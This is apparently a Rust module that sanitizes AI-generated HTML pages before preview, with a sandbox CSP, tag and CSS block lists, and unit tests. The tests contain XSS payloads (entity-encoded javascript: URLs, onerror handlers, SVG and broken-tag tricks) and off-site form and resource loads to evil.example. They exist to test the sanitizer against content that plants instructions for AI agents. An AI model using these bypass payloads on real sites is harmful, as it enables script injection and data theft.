//! Every generated page is cleaned before it is stored or shown.
//!
//! The site's content is untrusted (the fixture site plants instructions aimed at AI agents), so
//! a design an agent wrote from it is untrusted too. [`sanitize`] rebuilds the document from its
//! tokens and keeps only what a static page needs:
//!
//! - no `<script>`, `<iframe>`, `<object>`, `<embed>`, `<applet>`, `<frame>`, `<base>`,
//!   `<noscript>` or refresh `<meta>`;
//! - no inline event handlers (`on…`), `srcdoc` or `formaction`;
//! - no `javascript:`, `vbscript:` or `data:text/html` URL anywhere, even entity-encoded;
//! - no form that posts off-site (the form's tags go, its fields stay);
//! - no external resource except Google Fonts: stylesheets only from `fonts.googleapis.com`,
//!   fonts from `fonts.gstatic.com`, images only as `data:image/…`, as paths on the page's own
//!   origin, or from the site's own hosts ([`Policy::image_hosts`]); CSS `url()`, `@import`
//!   and `image-set()` follow the same rule;
//! - no comments, CDATA or processing instructions.
//!
//! Previews are also served with a strict CSP inside `<iframe sandbox>` ([`preview_csp`]), so a
//! miss here still can't run code.

/// The Content-Security-Policy every preview is served with. Under `sandbox` the preview's
/// origin is opaque, so `'self'` matches nothing: the platform's own origin is named for
/// images and as the only page that may frame it.
pub fn preview_csp(origin: &str) -> String {
    let origin: String = origin
        .trim_end_matches('/')
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, ':' | '/' | '.' | '-' | '[' | ']'))
        .collect();
    format!(
        "sandbox; default-src 'none'; img-src 'self' {origin} data: https:; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; form-action 'none'; base-uri 'none'; frame-ancestors {origin}"
    )
}

/// What a cleaned page may still load.
#[derive(Debug, Clone, Default)]
pub struct Policy {
    /// Hosts images may come from over https, lower-case (the site's own, e.g. `kilele.example`
    /// and `www.kilele.example`).
    pub image_hosts: Vec<String>,
}

impl Policy {
    /// A policy allowing images from `host` and its `www.` twin.
    pub fn for_host(host: &str) -> Self {
        let host = host.trim().to_ascii_lowercase();
        let bare = host.strip_prefix("www.").unwrap_or(&host).to_owned();
        Self {
            image_hosts: vec![bare.clone(), format!("www.{bare}")],
        }
    }
}

/// Elements dropped together with everything up to their closing tag (raw text in HTML).
const DROP_RAW: &[&str] = &[
    "script",
    "iframe",
    "noembed",
    "noframes",
    "noscript",
    "xmp",
    "plaintext",
];
/// Elements whose tags are dropped; their children stay (and are cleaned on their own).
const DROP_TAG: &[&str] = &[
    "object",
    "embed",
    "applet",
    "frame",
    "frameset",
    "base",
    "portal",
    "param",
    "template",
    "foreignobject",
];
/// Raw-text or escapable raw-text elements kept, with their text cleaned.
const KEEP_RAW: &[&str] = &["style", "textarea", "title"];

/// Attributes whose value loads something into the page.
const RESOURCE_ATTRS: &[&str] = &[
    "src",
    "srcset",
    "imagesrcset",
    "poster",
    "background",
    "lowsrc",
    "dynsrc",
    "data",
    "codebase",
    "manifest",
    "icon",
];
/// Attributes that navigate or cite.
const LINK_ATTRS: &[&str] = &["href", "xlink:href", "action", "cite", "longdesc"];
/// Attributes never kept.
const DROP_ATTRS: &[&str] = &["srcdoc", "formaction", "ping", "http-equiv", "is"];
/// Elements where `href` loads a resource rather than navigating.
const RESOURCE_HREF_ELEMENTS: &[&str] = &["image", "use", "feimage", "link", "script"];

/// Cleans `html` as described in the module docs and returns a whole document.
pub fn sanitize(html: &str, policy: &Policy) -> String {
    let mut out = String::with_capacity(html.len());
    let bytes = html.as_bytes();
    let mut i = 0;
    let mut text_start = 0;
    let mut dropped_forms = 0usize;
    let mut doctype = false;

    while i < bytes.len() {
        if bytes[i] != b'<' {
            i += 1;
            continue;
        }
        // Flush the text before this `<`.
        out.push_str(&html[text_start..i]);
        let rest = &html[i..];
        let next = bytes.get(i + 1).copied();
        match next {
            Some(b'!') => {
                if rest.starts_with("<!--") {
                    i = find_from(html, i + 4, "-->").map_or(bytes.len(), |e| e + 3);
                } else if rest.len() >= 9 && rest[..9].eq_ignore_ascii_case("<!doctype") {
                    if !doctype {
                        out.push_str("<!DOCTYPE html>");
                        doctype = true;
                    }
                    i = find_from(html, i, ">").map_or(bytes.len(), |e| e + 1);
                } else if rest.starts_with("<![CDATA[") {
                    i = find_from(html, i, "]]>").map_or(bytes.len(), |e| e + 3);
                } else {
                    i = find_from(html, i, ">").map_or(bytes.len(), |e| e + 1);
                }
            }
            Some(b'?') => {
                i = find_from(html, i, ">").map_or(bytes.len(), |e| e + 1);
            }
            Some(b'/') => {
                let name_start = i + 2;
                let name_end = tag_name_end(bytes, name_start);
                if name_end == name_start {
                    out.push_str("&lt;");
                    i += 1;
                } else {
                    let name = html[name_start..name_end].to_ascii_lowercase();
                    let end = find_from(html, name_end, ">");
                    i = end.map_or(bytes.len(), |e| e + 1);
                    if end.is_none() {
                        // An unfinished closing tag at the end of a partial page.
                    } else if name == "form" && dropped_forms > 0 {
                        dropped_forms -= 1;
                    } else if !DROP_TAG.contains(&name.as_str()) {
                        out.push_str("</");
                        out.push_str(&name);
                        out.push('>');
                    }
                }
            }
            Some(c) if c.is_ascii_alphabetic() => {
                let name_start = i + 1;
                let name_end = tag_name_end(bytes, name_start);
                let name = html[name_start..name_end].to_ascii_lowercase();
                let Some((attrs, after)) = parse_attrs(html, name_end) else {
                    // An unfinished tag at the end of a partial page: drop the rest.
                    i = bytes.len();
                    text_start = i;
                    break;
                };
                i = after;
                if DROP_RAW.contains(&name.as_str()) {
                    i = if name == "plaintext" {
                        bytes.len()
                    } else {
                        close_tag(html, i, &name).map_or(bytes.len(), |(_, e)| e)
                    };
                } else if KEEP_RAW.contains(&name.as_str()) {
                    let (content_end, close_end) =
                        close_tag(html, i, &name).unwrap_or((bytes.len(), bytes.len()));
                    let content = &html[i..content_end];
                    write_tag(&mut out, &name, &attrs, policy);
                    if name == "style" {
                        out.push_str(&clean_css(content, policy));
                    } else {
                        out.push_str(&content.replace('<', "&lt;"));
                    }
                    if close_end > content_end || content_end < bytes.len() {
                        out.push_str("</");
                        out.push_str(&name);
                        out.push('>');
                    }
                    i = close_end;
                } else if DROP_TAG.contains(&name.as_str()) {
                    // Tag gone, children stay.
                } else if name == "meta" && has_attr(&attrs, "http-equiv") {
                    // No refreshes or policy overrides.
                } else if name == "link" && !google_fonts_link(&attrs) {
                    // Only Google Fonts stylesheets.
                } else if name == "form" && posts_off_site(&attrs) {
                    dropped_forms += 1;
                } else {
                    write_tag(&mut out, &name, &attrs, policy);
                }
            }
            _ => {
                out.push_str("&lt;");
                i += 1;
            }
        }
        text_start = i;
    }
    if text_start < bytes.len() {
        out.push_str(&html[text_start..]);
    }
    out
}

/// The byte offset of `needle` at or after `from`, ASCII case-insensitive.
fn find_from(hay: &str, from: usize, needle: &str) -> Option<usize> {
    let h = hay.as_bytes();
    let n = needle.as_bytes();
    if from > h.len() || n.is_empty() {
        return None;
    }
    (from..=h.len().saturating_sub(n.len())).find(|&s| h[s..s + n.len()].eq_ignore_ascii_case(n))
}

/// Where a tag name that starts at `start` ends: letters, digits, `-`, `:` and `_`.
fn tag_name_end(bytes: &[u8], start: usize) -> usize {
    let mut j = start;
    while j < bytes.len()
        && (bytes[j].is_ascii_alphanumeric() || matches!(bytes[j], b'-' | b':' | b'_'))
    {
        j += 1;
    }
    j
}

/// The closing tag `</name` (followed by space, `/` or `>`) at or after `from`: where it starts,
/// and just after its `>`.
fn close_tag(html: &str, from: usize, name: &str) -> Option<(usize, usize)> {
    let needle = format!("</{name}");
    let bytes = html.as_bytes();
    let mut at = from;
    loop {
        let s = find_from(html, at, &needle)?;
        let after = s + needle.len();
        match bytes.get(after) {
            Some(b'>' | b'/' | b' ' | b'\t' | b'\n' | b'\r' | b'\x0c') | None => {
                let end = find_from(html, after, ">").map_or(bytes.len(), |e| e + 1);
                return Some((s, end));
            }
            _ => at = after,
        }
    }
}

/// One attribute as written: lower-case name, raw value (entities not decoded).
type Attr = (String, Option<String>);

/// Parses attributes from `from` to the tag's `>`; returns them and the offset after `>`.
/// `None` when the tag never ends.
fn parse_attrs(html: &str, from: usize) -> Option<(Vec<Attr>, usize)> {
    let b = html.as_bytes();
    let mut j = from;
    let mut attrs = Vec::new();
    loop {
        while j < b.len() && (b[j].is_ascii_whitespace() || b[j] == b'/') {
            j += 1;
        }
        if j >= b.len() {
            return None;
        }
        if b[j] == b'>' {
            return Some((attrs, j + 1));
        }
        let name_start = j;
        while j < b.len() && !b[j].is_ascii_whitespace() && !matches!(b[j], b'/' | b'>' | b'=') {
            j += 1;
        }
        if j == name_start {
            // A stray `=`: skip it.
            j += 1;
            continue;
        }
        let name = html[name_start..j].to_ascii_lowercase();
        let mut k = j;
        while k < b.len() && b[k].is_ascii_whitespace() {
            k += 1;
        }
        if k < b.len() && b[k] == b'=' {
            k += 1;
            while k < b.len() && b[k].is_ascii_whitespace() {
                k += 1;
            }
            if k >= b.len() {
                return None;
            }
            let (value, end) = match b[k] {
                q @ (b'"' | b'\'') => {
                    let close = html[k + 1..].find(q as char)? + k + 1;
                    (html[k + 1..close].to_owned(), close + 1)
                }
                _ => {
                    let mut e = k;
                    while e < b.len() && !b[e].is_ascii_whitespace() && b[e] != b'>' {
                        e += 1;
                    }
                    (html[k..e].to_owned(), e)
                }
            };
            attrs.push((name, Some(value)));
            j = end;
        } else {
            attrs.push((name, None));
        }
    }
}

fn has_attr(attrs: &[Attr], name: &str) -> bool {
    attrs.iter().any(|(n, _)| n == name)
}

fn attr<'a>(attrs: &'a [Attr], name: &str) -> Option<&'a str> {
    attrs
        .iter()
        .find(|(n, _)| n == name)
        .and_then(|(_, v)| v.as_deref())
}

/// A `<link>` to a Google Fonts stylesheet or a preconnect to Google's font hosts.
fn google_fonts_link(attrs: &[Attr]) -> bool {
    let rel = attr(attrs, "rel")
        .map(str::to_ascii_lowercase)
        .unwrap_or_default();
    let href = attr(attrs, "href").map(normalised_url).unwrap_or_default();
    let fonts = href.starts_with("https://fonts.googleapis.com/")
        || href == "https://fonts.googleapis.com"
        || href.starts_with("https://fonts.gstatic.com");
    fonts
        && rel
            .split_ascii_whitespace()
            .all(|r| matches!(r, "stylesheet" | "preconnect" | "dns-prefetch"))
}

/// A form whose `action` leaves this page's own origin.
fn posts_off_site(attrs: &[Attr]) -> bool {
    match attr(attrs, "action").map(normalised_url) {
        None => false,
        Some(a) => a.contains("//") || a.contains(':') || a.starts_with('\\'),
    }
}

/// Decodes the entities that can hide a scheme, drops whitespace and control characters, and
/// lower-cases: what a browser would act on.
fn normalised_url(raw: &str) -> String {
    decode_entities(raw)
        .chars()
        .filter(|c| !c.is_whitespace() && !c.is_control())
        .collect::<String>()
        .to_ascii_lowercase()
}

fn decode_entities(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let mut rest = raw;
    while let Some(amp) = rest.find('&') {
        out.push_str(&rest[..amp]);
        let tail = &rest[amp + 1..];
        let end = tail
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '#'))
            .unwrap_or(tail.len());
        let entity = &tail[..end];
        let decoded = if let Some(num) = entity.strip_prefix('#') {
            let n = if let Some(hex) = num.strip_prefix(['x', 'X']) {
                u32::from_str_radix(hex, 16).ok()
            } else {
                num.parse::<u32>().ok()
            };
            n.and_then(char::from_u32)
        } else {
            match entity.to_ascii_lowercase().as_str() {
                "colon" => Some(':'),
                "tab" => Some('\t'),
                "newline" => Some('\n'),
                "amp" => Some('&'),
                "lt" => Some('<'),
                "gt" => Some('>'),
                "quot" => Some('"'),
                "apos" => Some('\''),
                "sol" => Some('/'),
                "lpar" => Some('('),
                "rpar" => Some(')'),
                "nbsp" => Some(' '),
                _ => None,
            }
        };
        match decoded {
            Some(c) if !entity.is_empty() => {
                out.push(c);
                let skip = end + usize::from(tail[end..].starts_with(';'));
                rest = &tail[skip..];
            }
            _ => {
                out.push('&');
                rest = tail;
            }
        }
    }
    out.push_str(rest);
    out
}

/// A value that would run code or render a document wherever it is used.
fn dangerous_value(normalised: &str) -> bool {
    normalised.contains("javascript:")
        || normalised.contains("vbscript:")
        || normalised.contains("livescript:")
        || normalised.contains("data:text/html")
        || normalised.contains("data:application")
}

/// A URL an image (or font, or other loaded resource) may come from.
fn resource_allowed(url: &str, policy: &Policy) -> bool {
    let u = normalised_url(url);
    if u.starts_with("data:image/") && !u.starts_with("data:image/svg") {
        return true;
    }
    if u.starts_with("https://fonts.gstatic.com/") {
        return true;
    }
    let Some(rest) = u.strip_prefix("https://") else {
        // A fragment, or a path on the page's own origin (the site's photos keep their paths
        // in the new site); never another scheme or a protocol-relative host.
        let scheme = u
            .find(':')
            .is_some_and(|c| !u[..c].contains(['/', '?', '#']));
        return !u.is_empty() && !u.starts_with("//") && !u.starts_with('\\') && !scheme;
    };
    let host = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or_default()
        .rsplit('@')
        .next()
        .unwrap_or_default();
    let host = host.split(':').next().unwrap_or_default();
    policy.image_hosts.iter().any(|h| h == host)
}

/// A link a visitor may follow.
fn link_allowed(url: &str) -> bool {
    let u = normalised_url(url);
    if u.is_empty() || u.starts_with('#') || u.starts_with('?') {
        return true;
    }
    if u.starts_with("//") || u.starts_with('\\') {
        return false;
    }
    match u.find(':') {
        // A relative path (a colon only after the first slash, query or fragment).
        None => true,
        Some(colon) => {
            let before = &u[..colon];
            if before.contains(['/', '?', '#']) {
                return true;
            }
            matches!(before, "http" | "https" | "mailto" | "tel" | "sms")
        }
    }
}

/// `srcset` entries, each allowed or the whole attribute goes.
fn srcset_allowed(value: &str, policy: &Policy) -> bool {
    value.split(',').all(|entry| {
        entry
            .split_ascii_whitespace()
            .next()
            .is_none_or(|url| resource_allowed(url, policy))
    })
}

fn write_tag(out: &mut String, name: &str, attrs: &[Attr], policy: &Policy) {
    out.push('<');
    out.push_str(name);
    for (attr_name, value) in attrs {
        if !attr_name
            .bytes()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'-' | b':' | b'_' | b'.'))
            || attr_name.starts_with("on")
            || DROP_ATTRS.contains(&attr_name.as_str())
        {
            continue;
        }
        let Some(value) = value else {
            out.push(' ');
            out.push_str(attr_name);
            continue;
        };
        let norm = normalised_url(value);
        if dangerous_value(&norm) {
            continue;
        }
        let kept: Option<String> = if attr_name == "style" {
            let css = clean_css(&decode_entities(value), policy);
            (!css.trim().is_empty()).then_some(css)
        } else if attr_name.ends_with("srcset") {
            srcset_allowed(value, policy).then(|| value.clone())
        } else if RESOURCE_ATTRS.contains(&attr_name.as_str())
            || ((attr_name == "href" || attr_name == "xlink:href")
                && RESOURCE_HREF_ELEMENTS.contains(&name))
        {
            let ok = if name == "link" {
                // Already checked: a Google Fonts link.
                true
            } else {
                resource_allowed(value, policy)
            };
            ok.then(|| value.clone())
        } else if LINK_ATTRS.contains(&attr_name.as_str()) {
            link_allowed(value).then(|| value.clone())
        } else {
            Some(value.clone())
        };
        if let Some(v) = kept {
            out.push(' ');
            out.push_str(attr_name);
            out.push_str("=\"");
            out.push_str(&v.replace('"', "&quot;").replace('<', "&lt;"));
            out.push('"');
        }
    }
    out.push('>');
}

/// CSS functions and properties that load or run something, made invalid so the browser drops
/// the declaration.
const CSS_BLOCKED: &[&str] = &[
    "image-set",
    "-webkit-image-set",
    "expression",
    "behavior",
    "-moz-binding",
    "-o-link",
    "src",
];

/// Cleans a stylesheet or a `style` attribute: no comments, no escapes or `<` outside strings,
/// `url()` only for allowed resources, `@import` only for Google Fonts.
pub fn clean_css(css: &str, policy: &Policy) -> String {
    let chars: Vec<char> = css.chars().collect();
    let mut out = String::with_capacity(css.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match c {
            '/' if chars.get(i + 1) == Some(&'*') => {
                let mut j = i + 2;
                while j + 1 < chars.len() && !(chars[j] == '*' && chars[j + 1] == '/') {
                    j += 1;
                }
                i = (j + 2).min(chars.len());
            }
            '"' | '\'' => {
                let (s, next) = css_string(&chars, i);
                out.push_str(&s);
                i = next;
            }
            '\\' | '<' => i += 1,
            '@' => {
                let word: String = chars[i + 1..]
                    .iter()
                    .take_while(|c| c.is_ascii_alphanumeric() || **c == '-')
                    .collect();
                if word.eq_ignore_ascii_case("import") {
                    let mut j = i;
                    while j < chars.len() && chars[j] != ';' {
                        j += 1;
                    }
                    let stmt: String = chars[i..j].iter().collect();
                    if let Some(url) = first_css_url(&stmt)
                        && normalised_url(&url).starts_with("https://fonts.googleapis.com/")
                    {
                        out.push_str("@import url(\"");
                        out.push_str(&css_safe_url(&url));
                        out.push_str("\");");
                    }
                    i = (j + 1).min(chars.len());
                } else {
                    out.push('@');
                    i += 1;
                }
            }
            c if c.is_ascii_alphabetic() || c == '-' || c == '_' => {
                let start = i;
                while i < chars.len()
                    && (chars[i].is_ascii_alphanumeric() || chars[i] == '-' || chars[i] == '_')
                {
                    i += 1;
                }
                let ident: String = chars[start..i].iter().collect();
                let lower = ident.to_ascii_lowercase();
                let call = chars.get(i) == Some(&'(');
                if lower == "url" && call {
                    let (raw, next) = css_url_arg(&chars, i + 1);
                    i = next;
                    if resource_allowed(&raw, policy) && !raw.trim().starts_with('#') {
                        out.push_str("url(\"");
                        out.push_str(&css_safe_url(&raw));
                        out.push_str("\")");
                    } else {
                        out.push_str("none");
                    }
                } else if (call && CSS_BLOCKED.contains(&lower.as_str()))
                    || (lower != "src"
                        && chars.get(i) == Some(&':')
                        && CSS_BLOCKED.contains(&lower.as_str()))
                {
                    out.push_str("x-blocked");
                } else {
                    out.push_str(&ident);
                }
            }
            _ => {
                out.push(c);
                i += 1;
            }
        }
    }
    out
}

/// A CSS string starting at `start` (a quote), with `<` escaped; and where it ends.
fn css_string(chars: &[char], start: usize) -> (String, usize) {
    let quote = chars[start];
    let mut s = String::new();
    s.push(quote);
    let mut j = start + 1;
    while j < chars.len() {
        let c = chars[j];
        if c == '\\' && j + 1 < chars.len() {
            s.push(c);
            s.push(chars[j + 1]);
            j += 2;
            continue;
        }
        if c == '<' {
            s.push_str("\\3c ");
            j += 1;
            continue;
        }
        if c == '\n' {
            break;
        }
        s.push(c);
        j += 1;
        if c == quote {
            return (s, j);
        }
    }
    s.push(quote);
    (s, j)
}

/// The argument of `url(` starting at `start`, unquoted, and the offset after its `)`.
fn css_url_arg(chars: &[char], start: usize) -> (String, usize) {
    let mut j = start;
    while j < chars.len() && chars[j].is_whitespace() {
        j += 1;
    }
    let mut raw = String::new();
    if j < chars.len() && (chars[j] == '"' || chars[j] == '\'') {
        let q = chars[j];
        j += 1;
        while j < chars.len() && chars[j] != q && chars[j] != '\n' {
            raw.push(chars[j]);
            j += 1;
        }
        j += 1;
        while j < chars.len() && chars[j] != ')' {
            j += 1;
        }
    } else {
        while j < chars.len() && chars[j] != ')' {
            raw.push(chars[j]);
            j += 1;
        }
    }
    (raw.trim().to_owned(), (j + 1).min(chars.len()))
}

/// The first URL in an `@import` statement: `url(…)` or a string.
fn first_css_url(stmt: &str) -> Option<String> {
    let chars: Vec<char> = stmt.chars().collect();
    let lower = stmt.to_ascii_lowercase();
    if let Some(p) = lower.find("url(") {
        let idx = stmt[..p].chars().count() + 4;
        return Some(css_url_arg(&chars, idx).0);
    }
    let q = chars.iter().position(|c| *c == '"' || *c == '\'')?;
    let end = chars[q + 1..].iter().position(|c| *c == chars[q])? + q + 1;
    Some(chars[q + 1..end].iter().collect())
}

/// A URL safe inside `url("…")`.
fn css_safe_url(url: &str) -> String {
    url.chars()
        .filter(|c| !matches!(c, '"' | '\\' | '<' | '\n' | '\r' | '(' | ')'))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn clean(html: &str) -> String {
        sanitize(html, &Policy::for_host("kilele.example"))
    }

    #[test]
    fn scripts_and_their_text_go() {
        let out = clean("<p>a</p><script>alert(1)</script><SCRIPT src=x></SCRIPT ><p>b</p>");
        assert_eq!(out, "<p>a</p><p>b</p>");
        assert!(!clean("<script>never closed").contains("never"));
    }

    #[test]
    fn event_handlers_and_srcdoc_go() {
        let out =
            clean(r#"<img src="https://kilele.example/a.jpg" onerror="x()" ONLOAD=y alt="Bread">"#);
        assert_eq!(
            out,
            r#"<img src="https://kilele.example/a.jpg" alt="Bread">"#
        );
        assert!(!clean(r#"<div srcdoc="<script>">x</div>"#).contains("srcdoc"));
    }

    #[test]
    fn script_urls_go_even_when_encoded() {
        for bad in [
            r#"<a href="javascript:alert(1)">x</a>"#,
            r#"<a href=" JaVaScRiPt:alert(1)">x</a>"#,
            r#"<a href="jav&#x61;script:alert(1)">x</a>"#,
            r#"<a href="jav&#97script&colon;alert(1)">x</a>"#,
            r#"<a href="java&Tab;script:alert(1)">x</a>"#,
            r#"<a href="vbscript:x">x</a>"#,
            r#"<a href="data:text/html,<script>">x</a>"#,
            r#"<svg><a xlink:href="javascript:x"><text>x</text></a></svg>"#,
            r#"<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>"#,
        ] {
            let out = clean(bad);
            assert!(
                !out.to_ascii_lowercase().contains("script:"),
                "{bad} -> {out}"
            );
            assert!(!out.contains("data:text"), "{bad} -> {out}");
        }
        assert_eq!(
            clean(r#"<a href="/menu">Menu</a><a href="tel:+254700000000">Call</a>"#),
            r#"<a href="/menu">Menu</a><a href="tel:+254700000000">Call</a>"#
        );
    }

    #[test]
    fn frames_objects_and_bases_go() {
        let out = clean(
            r#"<iframe src="https://evil.example"></iframe><object data="x.swf"><p>fallback</p></object><embed src="x"><base href="https://evil.example/"><frameset><frame src=x></frameset>"#,
        );
        assert_eq!(out, "<p>fallback</p>");
    }

    #[test]
    fn off_site_forms_lose_their_tags_and_keep_their_fields() {
        let out = clean(
            r#"<form action="https://evil.example/steal" method="post"><input name="q"></form><form action="/ask"><input name="q"><button formaction="https://evil.example">Ask</button></form>"#,
        );
        assert_eq!(
            out,
            r#"<input name="q"><form action="/ask"><input name="q"><button>Ask</button></form>"#
        );
        assert!(!clean(r#"<form action="//evil.example"></form>"#).contains("<form"));
    }

    #[test]
    fn only_google_fonts_load_from_outside() {
        let out = clean(concat!(
            r#"<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fraunces&display=swap">"#,
            r#"<link rel="preconnect" href="https://fonts.gstatic.com">"#,
            r#"<link rel="stylesheet" href="https://evil.example/x.css">"#,
            r#"<link rel="icon" href="https://evil.example/x.ico">"#,
            r#"<meta http-equiv="refresh" content="0;url=https://evil.example">"#,
            r#"<meta name="viewport" content="width=device-width">"#,
        ));
        assert!(out.contains("fonts.googleapis.com/css2?family=Fraunces"));
        assert!(out.contains(r#"<link rel="preconnect" href="https://fonts.gstatic.com">"#));
        assert!(!out.contains("evil"), "{out}");
        assert!(out.contains(r#"<meta name="viewport""#));
    }

    #[test]
    fn images_only_from_the_site_or_inline() {
        let out = clean(concat!(
            r#"<img src="https://www.kilele.example/bread.jpg">"#,
            r#"<img src="https://tracker.example/p.gif">"#,
            r#"<img src="data:image/png;base64,AAAA">"#,
            r#"<img src="data:image/svg+xml,<svg onload=x>">"#,
            r#"<img src="/img/sourdough.webp"><img src="//evil.example/p.gif"><img src="http://evil.example/p.gif">"#,
            r#"<img srcset="https://kilele.example/a.jpg 1x, https://evil.example/b.jpg 2x">"#,
            r#"<video poster="https://evil.example/p.jpg"></video>"#,
        ));
        assert!(out.contains("www.kilele.example/bread.jpg"));
        assert!(out.contains("data:image/png"));
        assert!(out.contains(r#"<img src="/img/sourdough.webp">"#));
        assert!(!out.contains("tracker.example"));
        assert!(!out.contains("svg+xml"));
        assert!(!out.contains("evil.example"), "{out}");
    }

    #[test]
    fn styles_keep_their_look_and_lose_their_reach() {
        let css = concat!(
            "@import url('https://fonts.googleapis.com/css2?family=Inter');",
            "@import 'https://evil.example/x.css';",
            ":root{--accent:#8a3b12}/* note */",
            ".hero{background:url(https://evil.example/bg.jpg) center;color:var(--accent)}",
            ".a{background-image:url(\"https://kilele.example/a.jpg\")}",
            ".b{background:image-set(\"https://evil.example/x.png\" 1x)}",
            ".c{width:expression(alert(1))}",
            ".e{b\\61ckground:u\\72l(https://evil.example/esc.png)}",
            "@font-face{font-family:X;src:url(https://fonts.gstatic.com/s/x.woff2)}",
            ".q{content:\"<b>\"}",
            // The HTML parser ends a style at `</style`, even inside a CSS string.
            ".d{content:\"</style><script>\"}",
        );
        let out = clean(&format!("<style>{css}</style>"));
        assert!(out.contains("@import url(\"https://fonts.googleapis.com/css2?family=Inter\");"));
        assert!(out.contains("--accent:#8a3b12"));
        assert!(out.contains("url(\"https://kilele.example/a.jpg\")"));
        assert!(out.contains("url(\"https://fonts.gstatic.com/s/x.woff2\")"));
        // What's left of the blocked parts can't load anything: no url(), import or image-set.
        assert!(
            !out.contains("url(\"https://evil") && !out.contains("url(https://evil"),
            "{out}"
        );
        assert!(
            !out.contains("x.css") && !out.contains("image-set"),
            "{out}"
        );
        assert!(out.contains(".hero{background:none center"));
        assert!(!out.contains("expression("));
        assert!(!out.contains("note"));
        assert!(!out.to_ascii_lowercase().contains("<script"));
        assert!(out.contains(r#".q{content:"\3c b>"}"#), "{out}");
        let inline =
            clean(r#"<div style="background:url(https://evil.example/x.png);color:red">x</div>"#);
        assert_eq!(inline, r#"<div style="background:none;color:red">x</div>"#);
    }

    #[test]
    fn tricks_with_broken_tags_and_comments_stay_text() {
        let out = clean("<scr<script>ipt>alert(1)</script><!-- <script>x</script> --><p>ok</p>");
        assert!(!out.contains("<script"), "{out}");
        assert!(out.contains("<p>ok</p>"));
        let svg = clean("<svg><style><img src=x onerror=alert(1)></style></svg>");
        assert!(!svg.contains("<img"), "{svg}");
        let title = clean("<title><img src=x onerror=1></title>");
        assert!(!title.contains("<img"), "{title}");
        let attr = clean(r#"<p title="</p><script>alert(1)</script>">x</p>"#);
        assert!(!attr.contains("<script"), "{attr}");
    }

    #[test]
    fn a_partial_page_cleans_without_panicking() {
        let full = r#"<!doctype html><html><head><style>.a{color:red}</style></head><body><h1 class="t">Kilele</h1><p>Bread &amp; cakes</p></body></html>"#;
        for cut in 0..full.len() {
            let _ = clean(&full[..cut]);
        }
        let out = clean(full);
        assert!(out.starts_with("<!DOCTYPE html><html><head><style>.a{color:red}</style>"));
        assert!(out.contains("Bread &amp; cakes"));
    }
}
